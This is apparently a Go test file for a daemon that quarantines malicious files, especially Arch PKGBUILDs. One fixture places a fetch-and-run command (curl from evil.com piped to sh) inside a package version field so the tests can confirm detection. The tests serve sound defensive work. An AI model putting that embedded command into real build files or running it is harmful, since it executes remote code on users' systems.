package main

import (
	"bytes"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/OnlyOneArthur/quarantine-daemon/internal/config"
	"github.com/OnlyOneArthur/quarantine-daemon/internal/quarantine"
)

const maliciousPKGBUILD = `pkgname=malicious-root
pkgver=$(curl -s http://evil.com/x | sh)
pkgrel=1
arch=('x86_64')
source=()
`

const cleanPKGBUILD = `pkgname=clean-app
pkgver=1.2.3
pkgrel=1
arch=('x86_64')
url="https://github.com/example/clean-app"
license=('MIT')
source=("https://github.com/example/clean-app/archive/v1.2.3.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

build() {
    cd "$pkgname-$pkgver"
    make PREFIX=/usr
}
`

// discardLogger returns a logger that drops output for tests that do not inspect logs.
func discardLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// newTestPipeline builds a pipeline over a temp vault with default config.
func newTestPipeline(t *testing.T) (*pipeline, *quarantine.Vault, *config.Config, string) {
	t.Helper()
	root := t.TempDir()
	cfg := config.DefaultConfig()
	cfg.Quarantine.VaultDir = filepath.Join(root, "vault")

	vault, err := quarantine.New(cfg.Quarantine.VaultDir)
	if err != nil {
		t.Fatalf("quarantine.New: %v", err)
	}
	t.Cleanup(func() { _ = vault.Close() })

	return newPipeline(cfg, vault, discardLogger()), vault, cfg, root
}

func writeFixture(t *testing.T, dir, name string, data []byte) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatalf("write fixture: %v", err)
	}
	return path
}

func TestMaliciousPKGBUILDIsQuarantined(t *testing.T) {
	p, vault, _, root := newTestPipeline(t)
	watchDir := filepath.Join(root, "watch")
	path := writeFixture(t, watchDir, "PKGBUILD", []byte(maliciousPKGBUILD))

	meta, err := p.handlePath(path)
	if err != nil {
		t.Fatalf("handlePath: %v", err)
	}
	if meta == nil {
		t.Fatal("expected quarantine metadata for malicious PKGBUILD, got nil")
	}
	if meta.Score < 85 {
		t.Errorf("expected score >= 85, got %d", meta.Score)
	}
	if meta.OriginalPath != path {
		t.Errorf("OriginalPath = %q, want %q", meta.OriginalPath, path)
	}
	if !meta.IsPKGBUILD {
		t.Error("expected IsPKGBUILD metadata flag")
	}
	if len(meta.Triggers) == 0 {
		t.Error("expected triggers recorded in metadata")
	}

	// The original payload must now live only in the vault; the watched path holds the blocking stub.
	stub, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read stub: %v", err)
	}
	if bytes.Equal(stub, []byte(maliciousPKGBUILD)) {
		t.Error("original PKGBUILD still present at watched path")
	}
	if !strings.Contains(string(stub), "Quarantined by quarantined daemon") {
		t.Errorf("expected blocking stub at watched path, got %q", stub)
	}

	inspected, err := vault.Inspect(meta.ID)
	if err != nil {
		t.Fatalf("Inspect: %v", err)
	}
	if inspected.SHA256 != meta.SHA256 {
		t.Errorf("inspected SHA256 mismatch")
	}
	if p.quarantined.Load() != 1 {
		t.Errorf("quarantined counter = %d, want 1", p.quarantined.Load())
	}
}

func TestCleanPKGBUILDPassesUntouched(t *testing.T) {
	p, _, _, root := newTestPipeline(t)
	path := writeFixture(t, filepath.Join(root, "watch"), "PKGBUILD", []byte(cleanPKGBUILD))

	meta, err := p.handlePath(path)
	if err != nil {
		t.Fatalf("handlePath: %v", err)
	}
	if meta != nil {
		t.Fatalf("clean PKGBUILD quarantined: %+v", meta)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !bytes.Equal(got, []byte(cleanPKGBUILD)) {
		t.Error("clean PKGBUILD content modified")
	}
	if p.quarantined.Load() != 0 {
		t.Errorf("quarantined counter = %d, want 0", p.quarantined.Load())
	}
}

func TestCleanFilePassesUntouched(t *testing.T) {
	p, _, _, root := newTestPipeline(t)
	payload := []byte("hello, this is a harmless text note\n")
	path := writeFixture(t, filepath.Join(root, "watch"), "notes.txt", payload)

	meta, err := p.handlePath(path)
	if err != nil {
		t.Fatalf("handlePath: %v", err)
	}
	if meta != nil {
		t.Fatalf("clean file quarantined: %+v", meta)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !bytes.Equal(got, payload) {
		t.Error("clean file content modified")
	}
}

func TestOversizeFileIsSkipped(t *testing.T) {
	p, _, cfg, root := newTestPipeline(t)
	cfg.Binary.MaxScanSizeMB = 1

	big := bytes.Repeat([]byte("A"), 1024*1024+1)
	path := writeFixture(t, filepath.Join(root, "watch"), "big.bin", big)

	meta, err := p.handlePath(path)
	if err != nil {
		t.Fatalf("handlePath: %v", err)
	}
	if meta != nil {
		t.Fatalf("oversize file quarantined: %+v", meta)
	}
	if p.scanned.Load() != 0 {
		t.Errorf("scanned counter = %d, want 0 for skipped file", p.scanned.Load())
	}
	if _, err := os.Stat(path); err != nil {
		t.Errorf("oversize file moved or removed: %v", err)
	}
}

func TestNonPositiveMaxScanSizeErrorsWithoutChangingSource(t *testing.T) {
	p, _, cfg, root := newTestPipeline(t)
	cfg.Binary.MaxScanSizeMB = 0
	payload := []byte("preserve this file")
	path := writeFixture(t, filepath.Join(root, "watch"), "payload.bin", payload)
	if _, err := p.handlePath(path); err == nil || !strings.Contains(err.Error(), "max_scan_size_mb must be positive") {
		t.Fatalf("handlePath error = %v, want invalid max scan size", err)
	}
	got, err := os.ReadFile(path)
	if err != nil || !bytes.Equal(got, payload) {
		t.Fatalf("source changed after config error: data=%q, err=%v", got, err)
	}
}

func TestIgnoredKindsSkippedWhenDisabled(t *testing.T) {
	p, _, cfg, root := newTestPipeline(t)
	cfg.PKGBUILD.Enabled = false
	path := writeFixture(t, filepath.Join(root, "watch"), "PKGBUILD", []byte(maliciousPKGBUILD))

	meta, err := p.handlePath(path)
	if err != nil {
		t.Fatalf("handlePath: %v", err)
	}
	if meta != nil {
		t.Fatalf("PKGBUILD quarantined while triage_pkgbuild disabled: %+v", meta)
	}
}
